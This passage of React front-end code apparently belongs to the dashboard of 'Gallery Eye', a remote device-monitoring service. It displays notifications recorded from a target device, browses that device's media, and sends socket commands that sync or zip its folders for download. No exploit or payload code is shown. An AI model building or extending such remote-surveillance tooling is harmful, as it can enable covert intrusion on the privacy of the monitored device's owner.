                                    onClick={() => setSelectedNotifApp(filter.key)}
                                    className={`px-5 py-2 rounded-full text-sm font-medium whitespace-nowrap transition-all border ${
                                        selectedNotifApp === filter.key 
                                            ? 'bg-cyan-500/10 border-cyan-500/30 text-cyan-400 shadow-sm' 
                                            : 'bg-white/5 border-white/5 text-white/50 hover:bg-white/10 hover:text-white'
                                    }`}
                                >
                                    {filter.label}
                                </button>
                            ))}
                        </div>
                        <div className="flex-1 overflow-y-auto space-y-3 scrollbar-hide">
                            {notifications.filter(n => selectedNotifApp === 'all' || notifAppFilters.find(f => f.key === selectedNotifApp)?.packages.includes(n.packageName)).length === 0 ? (
                                <div className="h-[40vh] flex flex-col items-center justify-center text-center space-y-4">
                                    <div className="w-16 h-16 rounded-2xl bg-white/5 flex items-center justify-center border border-white/5">
                                        <Bell size={24} className="text-white/20" />
                                    </div>
                                    <div className="text-white/40 font-medium text-sm">No notifications recorded yet.<br/>Ensure monitoring is active and the device is online.</div>
                                </div>
                            ) : (
                                notifications.filter(n => selectedNotifApp === 'all' || notifAppFilters.find(f => f.key === selectedNotifApp)?.packages.includes(n.packageName)).map((notif: any, i: number) => (
                                    <div key={i} className="p-5 rounded-2xl bg-white/5 border border-white/5 hover:border-white/10 hover:bg-white/[0.07] transition-colors flex flex-col sm:flex-row gap-4 sm:items-start">
                                        <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-cyan-500/20 to-blue-500/20 border border-cyan-500/10 flex items-center justify-center flex-shrink-0">
                                            <Bell size={18} className="text-cyan-400" />
                                        </div>
                                        <div className="flex-1 min-w-0">
                                            <div className="flex flex-col sm:flex-row sm:items-center justify-between mb-1 gap-1">
                                                <span className="font-semibold text-sm text-cyan-400">{notif.appName || notif.packageName}</span>
                                                <span className="text-xs text-white/40 font-data">{new Date(notif.receivedAt || notif.timestamp).toLocaleString()}</span>
                                            </div>
                                            <h4 className="font-medium text-white/90 mb-1 text-base">{notif.title}</h4>
                                            <p className="text-sm text-white/60 leading-relaxed">{notif.text}</p>
                                        </div>
                                    </div>
                                ))
                            )}
                        </div>
                    </div>
                );
            default:
                return null;
        }
    };

    return (
        <div className="flex w-full h-full min-h-screen bg-base text-fg-1 overflow-hidden relative">
            {/* Navigation */}
            <AppNavigation 
                devices={devices}
                selectedDeviceId={selectedDeviceId}
                setSelectedDeviceId={setSelectedDeviceId}
                setSelectedTool={setSelectedTool as any}
                userPlan={userPlan}
                setShowPlansModal={setShowPlansModal}
                handleSignOut={() => signOut()}
                onOpenAppModal={() => setShowAppModal(true)}
            />

            {/* Main Content Area */}
            <main className="flex-1 h-full w-full relative transition-all duration-300">
                {(!selectedTool || selectedTool !== 'gallery') && (
                    <div className="flex flex-col items-center justify-center w-full min-h-[70vh] text-center p-8 pt-32">
                        <div className="w-24 h-24 rounded-full neo-pressed flex items-center justify-center mb-6 shadow-accent-glow animate-pulse-soft">
                            <span className="text-4xl font-bold text-accent">GE</span>
                        </div>
                        <h1 className="text-3xl font-bold text-fg-1 mb-2">Welcome to Gallery Eye</h1>
                        <p className="text-fg-3 max-w-md">Select a tool from the top menu to get started. Manage devices, explore the gallery, or run remote commands.</p>
                    </div>
                )}

                {selectedTool === 'gallery' && (
                    <GalleryView 
                        images={images}
                        activeTab={activeTab}
                        setActiveTab={setActiveTab}
                        isSelectionMode={isSelectionMode}
                        setIsSelectionMode={setIsSelectionMode}
                        selectedItems={selectedItems}
                        toggleSelection={(id) => {
                            const newSet = new Set(selectedItems);
                            if (newSet.has(id)) newSet.delete(id);
                            else newSet.add(id);
                            setSelectedItems(newSet);
                        }}
                        handleBulkDownload={() => {}}
                        handleBulkDelete={() => {}}
                        setPreviewItem={setPreviewItem}
                        galleryLoaderRef={galleryLoaderRef}
                        isLoadingMore={isLoadingMore}
                        galleryHasMore={galleryHasMore}
                    />
                )}
            </main>

            {/* Tool Modal Overlay */}
            <AnimatePresence>
                {selectedTool && selectedTool !== 'gallery' && (
                    <motion.div
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className="fixed inset-0 z-[200] bg-black/60 backdrop-blur-md flex items-center justify-center p-4 md:p-8"
                    >
                        <motion.div
                            initial={{ scale: 0.95, y: 20 }}
                            animate={{ scale: 1, y: 0 }}
                            exit={{ scale: 0.95, y: 20 }}
                            className="relative w-full max-w-4xl h-[85vh] neo-surface flex flex-col overflow-hidden"
                        >
                            <div className="absolute top-4 right-4 z-50">
                                <button 
                                    onClick={() => setSelectedTool(null as any)} 
                                    className="p-3 neo-button rounded-xl text-fg-2 hover:text-danger transition-colors"
                                >
                                    <X className="w-6 h-6" />
                                </button>
                            </div>
                            <div className="flex-1 w-full h-full overflow-y-auto no-scrollbar relative z-10 pt-16 md:pt-4">
                                {renderTool()}
                            </div>
                        </motion.div>
                    </motion.div>
                )}
            </AnimatePresence>

            {/* Modals */}
            <AppGenerationModal isOpen={showAppModal} onClose={() => setShowAppModal(false)} uuid={session?.user?.uuid || ''} socket={socket} />
            <WhatsAppButton />
            <PlansModal isOpen={showPlansModal} onClose={() => setShowPlansModal(false)} currentPlan={userPlan as any} userEmail={session?.user?.email || ''} userUuid={session?.user?.uuid || ''} />
            <UpgradeModal isOpen={showUpgradeModal} onClose={() => setShowUpgradeModal(false)} feature={upgradeFeature} requiredPlan={requiredPlan} />
            
            <SyncOptionsModal
                isOpen={showSyncOptionsModal}
                onClose={() => setShowSyncOptionsModal(false)}
                folderName={syncOptionsFolder.name}
                itemCount={syncOptionsFolder.count}
                onSelectOneByOne={(count) => {
                    socket?.emit('trigger_sync', {
                        uuid: session?.user?.uuid,
                        targetDeviceId: selectedDeviceId,
                        folderName: syncOptionsFolder.name,
                        count,
                        mediaType: syncOptionsFolder.type
                    });
                    setShowSyncOptionsModal(false);
                }}
                onSelectZip={() => {
                    setZipProgress({ stage: 'creating', current: 0, total: syncOptionsFolder.count, url: '', error: '' });
                    setShowZipProgressModal(true);
                    socket?.emit('trigger_zip', {
                        uuid: session?.user?.uuid,
                        targetDeviceId: selectedDeviceId,
                        folderName: syncOptionsFolder.name,
                        mediaType: syncOptionsFolder.type
                    });
                    setShowSyncOptionsModal(false);
                }}
                userPlan={userPlan as any}
                mediaType={syncOptionsFolder.type}
                onUpgrade={() => setShowPlansModal(true)}
            />

            <ZipProgressModal
                isOpen={showZipProgressModal}
                onClose={() => setShowZipProgressModal(false)}
                stage={zipProgress.stage}
                current={zipProgress.current}
                total={zipProgress.total}
                folderName={syncOptionsFolder.name}
                downloadUrl={zipProgress.url}
                error={zipProgress.error}
            />

            <CustomAlertModal
                isOpen={showCustomAlert}
                onClose={() => setShowCustomAlert(false)}
                title={alertData.title}
                message={alertData.message}
                type={alertData.type}
            />

            <AnimatePresence>
                {(uploadProgress || isStartingSync) && (
                    <motion.div 
                        initial={{ opacity: 0, y: 50, scale: 0.9 }}
                        animate={{ opacity: 1, y: 0, scale: 1 }}
                        exit={{ opacity: 0, y: 50, scale: 0.9 }}
                        className="fixed bottom-24 right-6 md:bottom-10 md:right-10 z-[500] p-4 neo-surface flex items-center gap-5 min-w-[300px]"
                    >
                        <div className="w-10 h-10 rounded-xl bg-success/20 flex items-center justify-center flex-shrink-0 shadow-success-glow">
                            <RefreshCw size={20} className="text-success animate-spin" />
                        </div>
                        <div className="flex-1 w-full min-w-0">
                            <h4 className="font-semibold text-fg-1 text-sm">Syncing Media</h4>
                            <div className="w-full h-1.5 bg-white/10 rounded-full mt-2 overflow-hidden">
                                <div 
                                    className="h-full bg-success transition-all duration-300 rounded-full" 
                                    style={{ width: uploadProgress ? `${(uploadProgress.uploaded / uploadProgress.total) * 100}%` : '5%' }} 
                                />
                            </div>
                        </div>
                    </motion.div>
                )}
            </AnimatePresence>

            <AnimatePresence>
                {previewItem && (
                    <motion.div 
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0 }}
                        className="fixed inset-0 z-[600] bg-black/90 backdrop-blur-2xl flex items-center justify-center p-4 md:p-8"
                        onClick={() => setPreviewItem(null)}
                    >
                        <motion.div 
                            initial={{ scale: 0.95, opacity: 0 }}
                            animate={{ scale: 1, opacity: 1 }}
                            exit={{ scale: 0.95, opacity: 0 }}
                            className="relative max-w-6xl w-full h-full flex items-center justify-center"
                            onClick={(e) => e.stopPropagation()}
                        >
                            {previewItem.resource_type === 'video' ? (
                                <video src={previewItem.url} controls autoPlay className="max-w-full max-h-full rounded-xl neo-surface" />
                            ) : (
                                <img src={previewItem.url} alt="Preview" className="max-w-full max-h-full object-contain rounded-xl neo-surface" />
                            )}
                            <button onClick={() => setPreviewItem(null)} className="absolute top-4 right-4 p-3 rounded-full neo-button text-fg-1 hover:text-accent transition-colors">
                                <X size={24} />
                            </button>
                        </motion.div>
                    </motion.div>
                )}
            </AnimatePresence>
        </div>
    );
}
